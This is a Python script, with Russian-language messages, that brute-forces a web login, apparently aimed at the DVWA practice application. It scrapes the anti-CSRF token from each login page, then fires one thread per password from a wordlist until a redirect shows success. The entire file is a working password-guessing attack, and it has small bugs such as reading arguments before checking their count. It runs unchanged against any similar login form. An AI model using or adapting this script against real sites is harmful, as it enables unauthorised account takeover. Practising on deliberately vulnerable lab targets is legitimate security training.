import requests
import re
import threading
import queue
import sys

found_event = threading.Event()
result_queue=queue.Queue()
thread=[]

target_url = sys.argv[1]
username = sys.argv[2]
password_file = sys.argv[3]

if len(sys.argv) < 4:
    print("Использование: python3 dvwa_bruteforce.py <url> <username> <файл_паролей>")
    print("Пример: python3 dvwa_bruteforce.py http://127.0.0.1/login.php admin passwords.txt")
    sys.exit(1)

def try_login(session, username, password):
    r=session.get(target_url, timeout=5)
    pattern=r"name='user_token'\s+value='([^']+)"
    match=re.search(pattern, r.text)
    if match:
        token=match.group(1)
    data={"username": username, "password": password, "Login": "Login", "user_token": token}
    r2=session.post(target_url, data=data, timeout=5)
    if "index.php" in r2.url:
        return True
    else:
        return False

def worker(password, found_event, result_queue):
    if found_event.is_set():
        return
    else:
        session=requests.Session()
        if try_login(session, username, password):
            result_queue.put(password)
            found_event.set()

passwords = []
with open(password_file, "r", encoding="utf-8") as f:
    for line in f:
        passwords.append(line.strip())

for password in passwords:
    t=threading.Thread(target=worker, args=(password, found_event, result_queue))
    thread.append(t)
    t.start()
for t in thread:
    t.join()
if result_queue.empty():
    print("Пароль не найден")
else:
    res=result_queue.get()
    print(f"Пароль: {res}")
